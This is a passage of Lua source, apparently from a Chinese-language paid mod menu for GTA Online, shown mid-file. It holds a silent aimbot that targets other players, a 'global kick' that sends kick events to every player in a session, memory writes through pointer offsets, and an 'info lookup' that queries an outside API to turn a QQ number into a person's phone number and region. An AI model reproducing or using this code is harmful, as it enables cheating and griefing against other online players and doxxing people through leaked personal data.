        AUDIO.SET_AGGRESSIVE_HORNS(true) --Makes pedestrians sound their horn longer, faster and more agressive when they use their horn.
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, ENTITY.GET_ENTITY_SPEED(vehicle) + 1.2)
    end, onStop = function()
        AUDIO.SET_AGGRESSIVE_HORNS(false)
    end},
    {name = 'NPC警笛加速', command = 'JSnpcSirenBoost', description = '当NPC驾驶警车响起警笛时\n此功能会加速他们的载具喔', action = function(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if PED.IS_PED_A_PLAYER(ped) or not PED.IS_PED_IN_ANY_VEHICLE(ped, true) or not VEHICLE.IS_VEHICLE_SIREN_ON(vehicle) then return end
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, ENTITY.GET_ENTITY_SPEED(vehicle) + 1.2)
    end},
    {name = '自动杀死敌人', command = 'JSautokill', description = '立即击杀对您有敌意的NPC', action = function(ped)
        local rel = PED.GET_RELATIONSHIP_BETWEEN_PEDS(players.user_ped(), ped)
        if PED.IS_PED_A_PLAYER(ped) or ENTITY.IS_ENTITY_DEAD(ped) or not( (rel == 4 or rel == 5) or PED.IS_PED_IN_COMBAT(ped, players.user_ped()) ) then return end
        ENTITY.SET_ENTITY_HEALTH(ped, 0, 0)
    end},
}
----pvphelper
function GetTableFromV3Instance(v3int)
    local tbl = {x = v3.getX(v3int), y = v3.getY(v3int), z = v3.getZ(v3int)}
    return tbl
end
function SE_add_owned_explosion(ped, x, y, z, exptype, dmgscale, isheard, isinvis, camshake)
    FIRE.ADD_OWNED_EXPLOSION(ped, x, y, z, exptype, dmgscale, isheard, isinvis, camshake)
end
function DistanceBetweenTwoCoords(v3_1, v3_2)
    local distance = math.sqrt(((v3_2.x - v3_1.x)^2) + ((v3_2.y - v3_1.y)^2) + ((v3_2.z - v3_1.z)^2))
    return distance
end
AIM_WHITELIST = {}
Silent_Aimbot = {
    hitboxes = {
        head = {hash = 12844, toggled = false},
        spine = {hash = 24817, toggled = false},
        pelvis = {hash = 11816, toggled = false},
    },
    fov = 2,
    dist = 300,
    dmg = 100,
    los_check = true,
    fov_check = true,
    hash = 177293209, --heavy sniper mk2 hash
    advanced = {
        speed = -1
    }
}
function pid_to_handle(pid)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, memory.alloc(13*8), 13)
    return memory.alloc(13*8)
end
saimbot_mode = "closest"
function get_aimbot_target()
    local dist = 1000000000
    local cur_tar = 0
    for k,v in pairs(entities.get_all_peds_as_handles()) do
        local target_this = true
        local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        local ped_pos = ENTITY.GET_ENTITY_COORDS(v, true)
        local this_dist = MISC.GET_DISTANCE_BETWEEN_COORDS(player_pos['x'], player_pos['y'], player_pos['z'], ped_pos['x'], ped_pos['y'], ped_pos['z'], true)
        if PLAYER.PLAYER_PED_ID() ~= v and not ENTITY.IS_ENTITY_DEAD(v) then
            if not satarget_players then
                if PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not satarget_npcs then
                if not PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(PLAYER.PLAYER_PED_ID(), v, 17) then
                target_this = false
            end
            if satarget_usefov then
                if not PED.IS_PED_FACING_PED(PLAYER.PLAYER_PED_ID(), v, sa_fov) then
                    target_this = false
                end
            end
            if satarget_novehicles then
                if PED.IS_PED_IN_ANY_VEHICLE(v, true) then
                    target_this = false
                end
            end
            if satarget_nogodmode then
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(v) then
                    target_this = false
                end
            end
            if not satarget_targetfriends and satarget_players then
                if PED.IS_PED_A_PLAYER(v) then
                    local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(v)
                    local hdl = pid_to_handle(pid)
                    if NETWORK.NETWORK_IS_FRIEND(hdl) then
                        target_this = false
                    end
                end
            end
            if saimbot_mode == "closest" then
                if this_dist <= dist then
                    if target_this then
                        dist = this_dist
                        cur_tar = v
                    end
                end
            end
        end
    end
    return cur_tar
end
function ShootSingleBulletBetweenCoords(coords1, coords2, dmg, weaponhash, ownerped, audible, invisible, speed)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
        coords1.x, coords1.y, coords1.z,
        coords2.x, coords2.y, coords2.z,
        dmg, true, weaponhash, ownerped, audible, invisible, speed)
end
function ShootBulletAtPedBone(ped, boneID, dmg, weaponHash, speed)
    local bonecoords = PED.GET_PED_BONE_COORDS(ped, boneID, 0, 0, 0)
    local ourped = GetLocalPed()
    local ourhead = PED.GET_PED_BONE_COORDS(ourped, 12844, 0, 0, 0); local ourfront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ourped, 0, 1, 0)
    ourfront.z = ourhead.z --to shoot out of infront of our head
    ShootSingleBulletBetweenCoords(ourfront, bonecoords, dmg, weaponHash, ourped, true, false, speed)
end
function GetPlayerName_ped(ped)
    local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)
    local playerName = NETWORK.NETWORK_PLAYER_GET_NAME(playerID)
    return playerName
end
function GetSuitableAimbotTarget(fov, fovcheck, dist, loscheck)
    local ourped = GetLocalPed()
    local distsq = dist * dist
    local ourc = ENTITY.GET_ENTITY_COORDS(ourped)
    local entTable = entities.get_all_peds_as_pointers()
    local inRange = {}
    for _, entity in pairs(entTable) do
        local entpos = entities.get_position(entity)
            if SYSTEM.VDIST2(ourc.x, ourc.y, ourc.z, entpos.x, entpos.y, entpos.z) <= distsq then --distance check
                local handle = entities.pointer_to_handle(entity)
                if (handle ~= ourped) then
                    if (not PED.IS_PED_DEAD_OR_DYING(handle)) and (INTERIOR.GET_INTERIOR_FROM_ENTITY(handle) == 0) then --dead/interior check
                        if (fovcheck and PED.IS_PED_FACING_PED(ourped, handle, fov)) or (not fovcheck) then --fov check
                            if (PED.IS_PED_A_PLAYER(handle)) and (not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)]) then --whitelist, player check
                                if (loscheck and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ourped, handle, 17)) or (not loscheck) then --line-of-sight check
                                    inRange[#inRange+1] = handle
                                end
                            end
                        end
                    end
                end
            end
    end
    local retplayer
    local d = 99999999999
    if #inRange ~= 0 then
        for _, ped in pairs(inRange) do
            local tc = ENTITY.GET_ENTITY_COORDS(ped)
            local vidsti = SYSTEM.VDIST2(ourc.x, ourc.y, ourc.z, tc.x, tc.y, tc.z)
            if vidsti < d then
                retplayer = ped
                d = vidsti
            end
        end
        return retplayer
    end
    return nil
end
function DoesTableContainValue(table, value)
    for _, v in pairs(table) do
        if v == value then return true end
    end
    return false
end
function GetClosestPlayerWithRange_Whitelist_DisallowEntities(range, disallowedEntities, inair) --variation of GetClosestPlayerWithRange_Whitelist, that makes entities not returned if they are in the table.
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local tbl = {}
    local closest_player = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            local handle = entities.pointer_to_handle(pedPointers[i])
            local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
            if (inair and (ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(handle) >= 9)) or (not inair) then --air check
                if not AIM_WHITELIST[playerID] then --this is the whitelist check.
                    if not DoesTableContainValue(disallowedEntities, handle) then --this is the disallowed entities table check
                        tbl[#tbl+1] = handle
                    end
                end
            end
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= GetLocalPed() then
                if PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = ENTITY.GET_ENTITY_COORDS(tbl[i])
                    local e = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_player = tbl[i]
                    end
                end
            end
        end
    end
    if closest_player ~= 0 then
        return closest_player
    else
        return nil
    end
end
function GetValueIndexFromTable(table, value)
    for i, v in pairs(table) do
        if v == value then return i end
    end
    return nil
end
function GetClosestPlayerWithRange_Whitelist(range, inair) --variation of getClosestPlayerWithinRange to work with my whitelisting feature for silent aimbot
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local tbl = {}
    local closest_player = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            local handle = entities.pointer_to_handle(pedPointers[i])
            if (inair and (ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(handle) >= 9)) or (not inair) then --air check
                local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
                if not AIM_WHITELIST[playerID] then --this is the whitelist check.
                    tbl[#tbl+1] = handle
                end
            end
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= GetLocalPed() then
                if PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = ENTITY.GET_ENTITY_COORDS(tbl[i])
                    local e = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_player = tbl[i]
                    end
                end
            end
        end
    end
    if closest_player ~= 0 then
        return closest_player
    else
        return nil
    end
end
function GetClosestNonPlayerPedWithRange_DisallowedEntities(range, disallowedEntities, inair) --modified version of GetClosestNonPlayerPedWithRange that takes a table of disallowed entities (blacklisted peds)
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local tbl = {}
    local closest_ped = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            local handle = entities.pointer_to_handle(pedPointers[i])
            if (inair and (ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(handle) >= 9)) or (not inair) then
                if not DoesTableContainValue(disallowedEntities, handle) then
                    tbl[#tbl+1] = handle
                end
            end
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= GetLocalPed() then
                if not PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = getEntityCoords(tbl[i])
                    local e = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_ped = tbl[i]
                    end
                end
            end
        end
    end
    if closest_ped ~= 0 then
        return closest_ped
    else
        return nil
    end
end
function SetVehicleMissileSpeed(value)
    local offsets = {0x10D8, 0x70, 0x60, 0x58}
    local addr = entities.handle_to_pointer(PLAYER.PLAYER_PED_ID())
    for i = 1, (#offsets - 1) do
        -- make sure not to read from/write to a null pointer
        if addr == 0 then
            -- got a null pointer at some point
            return -1.0
        end
        addr = memory.read_long(addr + offsets[i])
    end
    addr = addr + offsets[#offsets]
    if addr == 0 then
        return -1.0
    else
        memory.write_float(addr, value)
        --memory.read_float(addr)
    end
end
function start_silent_aimbot()
    saimbot_thread = util.create_thread(function (thr)
    while true do
        if not silent_aimbot then
            util.stop_thread()
        end
        local target = get_aimbot_target()
        if target ~= 0 then
            local t_pos = PED.GET_PED_BONE_COORDS(target, 31086, 0.01, 0, 0)
            local t_pos2 = PED.GET_PED_BONE_COORDS(target, 31086, -0.01, 0, 0.00)
            -- debug shit, ignore
            if false then
                GRAPHICS.DRAW_MARKER(0, t_pos['x'], t_pos['y'], t_pos['z'], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
                GRAPHICS.DRAW_MARKER(0, t_pos2['x'], t_pos2['y'], t_pos2['z'], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
            end
            GRAPHICS.DRAW_MARKER(0, t_pos['x'], t_pos['y'], t_pos['z']+2, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, 1, 1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
            if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                local wep = WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID())
                local dmg = WEAPON.GET_WEAPON_DAMAGE(wep, 0)
                if satarget_damageo then
                    dmg = sa_odmg
                end
                local veh = PED.GET_VEHICLE_PED_IS_IN(target, false)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(t_pos['x'], t_pos['y'], t_pos['z'], t_pos2['x'], t_pos2['y'], t_pos2['z'], dmg, true, wep, PLAYER.PLAYER_PED_ID(), true, false, 10000, veh)
            end
        end
        wait()
    end
end)
end
function allplayEvents(events)
    for _, event in ipairs(events) do
        util.trigger_script_event(util.get_session_players_bitflag(), event)
    end
end
function func50()
    GTD(provip, "Pro 会员级功能")
    GTTG(provip,"僚机", {}, "所谓的左膀右臂", function(feat)
        liaoji(feat)
    end)
    current_selection = 1
    previous_selection = nil
    backgrounds = 4
    key_was_pressed = false 
    function switch_background()
        current_selection = current_selection + 1
        if current_selection > backgrounds then
            current_selection = 1 
        end
    end
    GTTG(provip, "集束技能", {}, "E键切换技能 吸力技能：按住右键无延迟吸附车辆，按下左键瞬间松开右键发射车辆\n爆裂功能：按一下右键触发地震爆裂 仙气功能：一束仙气条围绕着你，自动打击附近实体(俄洛伊) 烟花爆裂：按下X附近实体将释放爆裂以及烟花", function (f)
        if f then 
            x4 = util.create_tick_handler(function()
                local normal_size = 0.020
                local enlarged_size = 0.025
                local key_down = util.is_key_down(0x45)
                if key_down and not key_was_pressed then
                    switch_background()
                end
                key_was_pressed = key_down
                local default_colour = {r = 0, g = 1, b = 1, a = 1 * 0.5}
                local selected_colour = {r = 0, g = 1, b = 1, a = 1}
                if current_selection ~= previous_selection then
                    if current_selection == 1 then
                        xili.value = true 
                        hongzhaloop.value = false
                        miesha.value = false
                        firelp.value = false
                        show_subtitle("激活吸力技能", 2000)
                    elseif current_selection == 2 then
                        hongzhaloop.value = true
                        xili.value = false 
                        miesha.value = false
                        firelp.value = false
                        show_subtitle("激活爆裂功能", 2000)
                    elseif current_selection == 3 then
                        miesha.value = true
                        xili.value = false
                        hongzhaloop.value = false
                        firelp.value = false
                        show_subtitle("激活仙气功能", 2000)
                    elseif current_selection == 4 then
                        firelp.value = true
                        xili.value = false
                        hongzhaloop.value = false
                        miesha.value = false
                        show_subtitle("激活烟花集火", 2000)
                    end
                    previous_selection = current_selection
                end
                local size1 = (current_selection == 1) and enlarged_size or normal_size
                local colour1 = (current_selection == 1) and selected_colour or default_colour
                spacing(0.75, 0.9, size1 + 0.005, 0, 1, 1, 1 * 0.2) 
                spacing(0.75, 0.9, size1, colour1.r, colour1.g, colour1.b, colour1.a) 
                local size2 = (current_selection == 2) and enlarged_size or normal_size
                local colour2 = (current_selection == 2) and selected_colour or default_colour
                spacing(0.80, 0.9, size2 + 0.005, 0, 1, 1, 1 * 0.2)
                spacing(0.80, 0.9, size2, colour2.r, colour2.g, colour2.b, colour2.a) 
                local size3 = (current_selection == 3) and enlarged_size or normal_size
                local colour3 = (current_selection == 3) and selected_colour or default_colour
                spacing(0.85, 0.9, size3 + 0.005, 0, 1, 1, 1 * 0.2) 
                spacing(0.85, 0.9, size3, colour3.r, colour3.g, colour3.b, colour3.a) 
                local size4 = (current_selection == 4) and enlarged_size or normal_size
                local colour4 = (current_selection == 4) and selected_colour or default_colour
                spacing(0.90, 0.9, size4 + 0.005, 0, 1, 1, 1 * 0.2) 
                spacing(0.90, 0.9, size4, colour4.r, colour4.g, colour4.b, colour4.a) 
            end)
        else
            util.shoot_thread(x4)
            xili.value = false
            hongzhaloop.value = false
            miesha.value = false
            firelp.value = false
        end
    end)
end
function func388()
    GTD(mastervip, "Ultra 会员级功能")
    GTAC(mastervip, '全局忧郁踢', {}, '', function()
        allplayEvents(kickevents)
        for _, pid in players.list(false,true, true) do
            menu.trigger_commands("kick" .. PLAYER.GET_PLAYER_NAME(pid))
        end
    end)

    jsoncheckinfo = GT(mastervip, "信息查询箱")
    
    local json = require("json")
    local input_rid = ""
    local input_name = ""
    local input_qq = ""
    
    jsoncheckinfo:text_input("查询RID", {"ridcheck"}, "输入或者粘贴需要查询的ID(如查询不到就开启VPN)", function(ninput)
        input_rid = ninput
        async_http.init("https://sc-cache.com", "/n/" .. input_rid, function(rb, hr, re)
            local data = json.decode(rb)
            if data and data.id then
                util.toast(data.id)
            else
                util.toast("未找到RID")
            end
        end)
        async_http.dispatch()
    end, "")
    
    jsoncheckinfo:text_input("查询ID", {"scnamecheck"}, "输入或者粘贴需要查询的RID(如查询不到就开启VPN)", function(rinput)
        input_name = rinput
        async_http.init("https://sc-cache.com", "/r/" .. input_name, function(rb, hr, re)
            local data = json.decode(rb)
            if data and data[1] and data[1].name then
                util.toast(data[1].name)
            else
                util.toast("未找到ID")
            end
        end)
        async_http.dispatch()
    end, "")
    
    jsoncheckinfo:text_input("查询Q绑", {"qqofphonenumber"}, "输入或者粘贴需要查询的QQ号(如查询不到就开启VPN)", function(qinput)
        input_qq = qinput
        async_http.init("https://api.xywlapi.cc", "/qqapi?qq=" .. input_qq, function(rb, hr, re)
            local data = json.decode(rb)
            if data and data.phone and data.phonediqu then
                util.toast("手机号: " .. data.phone .. "\n地区: " .. data.phonediqu)
            else
                util.toast("未找到相关信息")
            end
        end)
        async_http.dispatch()
    end)

    GTTG(mastervip, "未来战士", {}, "WASD移动,鼠标右键开火,空格键上升,Ctrl下降,shift加速.", function(on)
        --TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        --wait(100)
        warriorfunc(on)
    end)
    Doctor_Octopus = GT(mastervip, "章鱼博士")
    shoot_back = false
    shootX = 0
    targetshootX = 0
    changeshootX = 0
    shootspeed = 0.1
    function lerp(a, b, t)
        return a + (b-a) * t
    end
    menu.slider(Doctor_Octopus, "机械魂骨射击动态偏移", {"changerotXY"}, "设置当射击时，是否让魂骨向前或向后偏移\n正数为向后偏移，负数为向前偏移", -40, 40, 0, 1, function (value)
        changeshootX = value
    end)
    Doctor_Octopus:toggle("章鱼博士的机械魂骨", {"octopusmode"}, "右键发射光线，可设置射击时动态前后偏移\n待机时会有前后微动效果", function(stats)
        if stats then
            gtoast("检测到新设备，新设备配对中...")
            local t = 0
            local speed = 0.003
            local direction = 1 -- 控制动画的方向（1 表示正向，-1 表示反向）
            local start_position = 30
            local end_position = 70
            movesleep = util.create_tick_handler(function()
                if not util.is_key_down(0x02) and not shoot_back then
                    t = t + speed * direction
                    if t >= 1 then
                        t = 1
                        direction = -1
                    elseif t <= 0 then
                        t = 0
                        direction = 1
                    end
                    _G.timemove = lerp(start_position, end_position, t)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1, players.user_ped(), 0, 0.1, -0.1, 0.5, timemove, 35, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm1, players.user_ped(), 0, 0.1, -0.1, 0.4, timemove, 90, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1_reverse, players.user_ped(), 0, -0.1, -0.1, 0.5, timemove, -35, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm1_reverse, players.user_ped(), 0, -0.1, -0.1, 0.4, timemove, -90, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1_Right, players.user_ped(), 0, 0.1, -0.1, 0.3, timemove, 135, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1_Left, players.user_ped(), 0, -0.1, -0.1, 0.3, timemove, -135, 0, false, false, false, true, 0, true)
                end
            end)
            local pos <const> = players.get_position(players.user())
            -- 右边
            rodm1 = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm2 = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm3 = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm4 = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            katana = spawn_object(util.joaat("prop_cs_katana_01"), pos, 1)
            zrodm1 = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm1_reverse = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            zrodm1_reverse = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm1_Right = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm1_Left = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1, players.user_ped(), 0, 0.1, -0.1, 0.5, 40, 35, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm2, rodm1, 0, 0, 0.28, 0.8, 140, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm3, rodm2, 0, 0, 0, 0.2, 180, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm4, rodm3, 0, 0, 0.5, 0.5, 90, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(katana, rodm4, 0, 0, 0, 0.3, 0, 181, 270, false, false, false, true, 0, true)
            -- 中右边
            --zrodm1 = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            zrodm2 = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            zrodm3 = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            zrodm4 = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            zkatana = spawn_object(util.joaat("prop_cs_katana_01"), pos, 1)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm1, players.user_ped(), 0, 0.1, -0.1, 0.4, 40, 90, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm2, zrodm1, 0, 0, 0.28, 0.8, 140, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm3, zrodm2, 0, 0, 0, 0.2, 180, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm4, zrodm3, 0, 0, 0.5, 0.5, 90, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(zkatana, zrodm4, 0, 0, 0, 0.3, 0, 181, 270, false, false, false, true, 0, true)
            -- 左边
            --katana = spawn_object(util.joaat("prop_cs_katana_01"), pos, 1)
            rodm2_reverse = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm3_reverse = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm4_reverse = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            katana_reverse = spawn_object(util.joaat("prop_cs_katana_01"), pos, 1)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1_reverse, players.user_ped(), 0, -0.1, -0.1, 0.5, 40, -35, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm2_reverse, rodm1_reverse, 0, 0, 0.28, 0.8, 140, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm3_reverse, rodm2_reverse, 0, 0, 0, 0.2, 180, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm4_reverse, rodm3_reverse, 0, 0, 0.5, 0.5, 90, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(katana_reverse, rodm4_reverse, 0, 0, 0, 0.3, 0, 181, 270, false, false, false, true, 0, true)
            -- 中左边
            --zrodm1_reverse = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            zrodm2_reverse = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            zrodm3_reverse = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            zrodm4_reverse = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            zkatana_reverse = spawn_object(util.joaat("prop_cs_katana_01"), pos, 1)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm1_reverse, players.user_ped(), 0, -0.1, -0.1, 0.4, 40, -90, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm2_reverse, zrodm1_reverse, 0, 0, 0.28, 0.8, 140, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm3_reverse, zrodm2_reverse, 0, 0, 0, 0.2, 180, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm4_reverse, zrodm3_reverse, 0, 0, 0.5, 0.5, 90, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(zkatana_reverse, zrodm4_reverse, 0, 0, 0, 0.3, 0, 181, 270, false, false, false, true, 0, true)
            -- 下右边
            --rodm1_Right = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm2_Right = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm3_Right = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm4_Right = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            katana_Right = spawn_object(util.joaat("prop_cs_katana_01"), pos, 1)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1_Right, players.user_ped(), 0, 0.1, -0.1, 0.3, 40, 135, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm2_Right, rodm1_Right, 0, 0, 0.28, 0.8, 140, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm3_Right, rodm2_Right, 0, 0, 0, 0.2, 180, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm4_Right, rodm3_Right, 0, 0, 0.5, 0.5, 90, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(katana_Right, rodm4_Right, 0, 0, 0, 0.3, 0, 181, 270, false, false, false, true, 0, true)
            -- 下左边
            --rodm1_Left = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm2_Left = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm3_Left = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            rodm4_Left = spawn_object(util.joaat("w_me_rod_m41"), pos, 1)
            katana_Left = spawn_object(util.joaat("prop_cs_katana_01"), pos, 1)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1_Left, players.user_ped(), 0, -0.1, -0.1, 0.3, 40, -135, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm2_Left, rodm1_Left, 0, 0, 0.28, 0.8, 140, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm3_Left, rodm2_Left, 0, 0, 0, 0.2, 180, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm4_Left, rodm3_Left, 0, 0, 0.5, 0.5, 90, 0, 0, false, false, false, true, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(katana_Left, rodm4_Left, 0, 0, 0, 0.3, 0, 181, 270, false, false, false, true, 0, true)
            threadyx = util.create_tick_handler(function()
                if util.is_key_down(0x02) then
                    shoot_back = true
                    targetshootX = changeshootX
                    shootX = lerp(shootX, targetshootX, shootspeed)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1, players.user_ped(), 0, 0.1, -0.1, 0.5, timemove+shootX, 35, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm1, players.user_ped(), 0, 0.1, -0.1, 0.4, timemove+shootX, 90, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1_reverse, players.user_ped(), 0, -0.1, -0.1, 0.5, timemove+shootX, -35, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm1_reverse, players.user_ped(), 0, -0.1, -0.1, 0.4, timemove+shootX, -90, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1_Right, players.user_ped(), 0, 0.1, -0.1, 0.3, timemove+shootX, 135, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1_Left, players.user_ped(), 0, -0.1, -0.1, 0.3, timemove+shootX, -135, 0, false, false, false, true, 0, true)
                    request_ptfx_asset("scr_reconstructionaccident")
